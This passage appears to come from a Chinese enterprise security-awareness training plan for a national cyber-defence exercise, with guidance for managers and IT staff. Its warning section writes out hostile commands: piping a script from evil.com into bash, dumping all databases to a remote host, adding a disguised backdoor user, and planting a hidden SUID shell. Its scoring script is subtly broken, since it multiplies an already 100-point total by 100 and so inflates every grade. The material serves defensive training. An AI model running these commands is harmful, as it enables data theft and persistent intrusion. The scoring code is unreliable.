## 2. 管理层培训

### 2.1 15分钟管理层专训

```markdown
# 护网管理层专训

## 你需要知道的三件事

### 1. 护网是什么？
- 全国范围的网络安全实战演练
- 有专业的攻击团队模拟真实攻击
- 政府/央企/金融等关键单位强制参加

### 2. 你的责任？
- 授权安全团队在紧急情况下采取断网等应急措施
- 保障安全团队的资源和值班条件
- 发生安全事件时，1小时内决策是否启动BCP
- 对外沟通的唯一出口（未经授权任何人不得对外谈论护网）

### 3. 可能出现的情况
- 攻击者可能通过钓鱼邮件获取员工账号
- 可能通过VPN漏洞或弱密码获取内网访问权限
- 你可能接到"领导紧急要求"的电话/短信（实际是攻击者社工）

## 护网期间应急决策树
事件发生 → 安全团队报告 → CISO决策
  ├─ 低风险 → 正常处置（不通知你）
  ├─ 中风险 → 口头通报 → 建议业务调整
  └─ 高风险(数据泄露/核心业务受影响) → 你的决策
       └─ 启动BCP → 通知集团公司 → 通知监管机构(如有需要)
```

## 3. IT运维培训

### 3.1 护网期间操作红线

```
❌ 禁止：
1. 在非跳板机上直接操作生产服务器
2. 使用弱密码或默认密码
3. 将代码/配置文件上传到公网(GitHub/网盘)
4. 在生产环境安装未经审批的软件
5. 临时关闭防火墙/安全策略（"就测试一下"）
6. 给非授权人员分享VPN/远程桌面账号
7. 在微信/QQ群中讨论护网细节

⚠️ 注意：
1. 所有运维操作必须通过堡垒机
2. 变更必须走工单审批
3. 排查问题先确认不是攻击行为
4. 发现异常立即上报，不要自己"试着修"
```

### 3.2 常见攻击伪装

```bash
# 攻击者可能伪装的运维命令
# 警惕以下模式：

# 伪装日志查看（实际是下载恶意文件）
curl http://evil.com/logs/update.sh | bash

# 伪装数据库备份（实际是数据外泄）
mysqldump -u root -p'cracked_password' --all-databases | curl -X POST http://evil.com/collect -d @-

# 创建后门用户
useradd -m -s /bin/bash oracle  # 假装创建Oracle用户

# 伪装备份操作（实际是植入持久化）
cp /bin/bash /tmp/.hidden/backup_bash; chmod u+s /tmp/.hidden/backup_bash
```

### 4.2 密码安全要点

```
✅ 好密码：至少12位，含大小写字母+数字+特殊字符
✅ 不同系统用不同密码
✅ 使用密码管理器（1Password/Keepass/Bitwarden）
✅ 开启MFA（多因素认证）

❌ 坏密码：
   Company@2026  （含公司名+年份）
   Password123!  （万能密码）
   admin2026     （admin+年份）
   qwerty123     （键盘序列）
   手机号/生日   （个人信息）
```

## 5. 培训考核

### 5.1 考核方式

| 层级 | 考核方式 | 及格线 | 不通过处理 |
|------|---------|--------|-----------|
| 普通员工 | 钓鱼测试 + 在线答题 | 点击率<15% + 答对≥80% | 补训 |
| IT运维 | 钓鱼测试 + 实操考核 | 0次点击 + 实操达标 | 补训+警告 |
| 管理层 | 桌面推演 | 决策<30min | — |

### 5.2 考核数据采集

```python
#!/usr/bin/env python3
"""培训考核统计"""

TRAINING_STATS = {
    "total_trained": 0,
    "exam_passed": 0,
    "phishing_test": {
        "total_sent": 0,
        "clicked": 0,
        "reported": 0     # 主动向安全团队报告的（最加分）
    }
}

def calculate_awareness_score(stats):
    """计算安全意识得分"""
    training_rate = stats["total_trained"] / stats.get("total_employees", 1)
    exam_pass_rate = stats["exam_passed"] / max(stats["total_trained"], 1)
    phishing_click_rate = stats["phishing_test"]["clicked"] / max(stats["phishing_test"]["total_sent"], 1)
    phishing_report_rate = stats["phishing_test"]["reported"] / max(stats["phishing_test"]["total_sent"], 1)

    score = (
        training_rate * 25 +
        exam_pass_rate * 25 +
        (1 - phishing_click_rate) * 30 +
        phishing_report_rate * 20
    ) * 100

    return {
        "score": round(score, 1),
        "training_rate": f"{training_rate*100:.0f}%",
        "exam_pass_rate": f"{exam_pass_rate*100:.0f}%",
        "phishing_click_rate": f"{phishing_click_rate*100:.1f}%",
        "phishing_report_rate": f"{phishing_report_rate*100:.1f}%",
        "grade": "A" if score >= 90 else ("B" if score >= 75 else "C")
    }
```
